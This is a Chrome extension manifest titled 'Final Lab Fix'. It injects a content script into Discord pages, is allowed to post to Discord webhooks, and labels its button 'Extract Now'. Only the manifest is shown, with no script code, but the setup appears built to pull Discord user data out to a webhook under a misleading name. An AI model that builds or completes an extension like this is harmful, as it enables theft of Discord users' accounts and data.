{
  "manifest_version": 3,
  "name": "Final Lab Fix",
  "version": "8.0",
  "permissions": ["storage", "activeTab", "scripting"],
  "host_permissions": ["*://*.discord.com/*", "https://*.discordapp.com/*", "https://discord.com/api/webhooks/*"],
  "background": { "service_worker": "background.js" },
  "action": { "default_title": "Extract Now" },
  "content_scripts": [
    {
      "matches": ["*://*.discord.com/*"],
      "js": ["content.js"]
    }
  ]
}
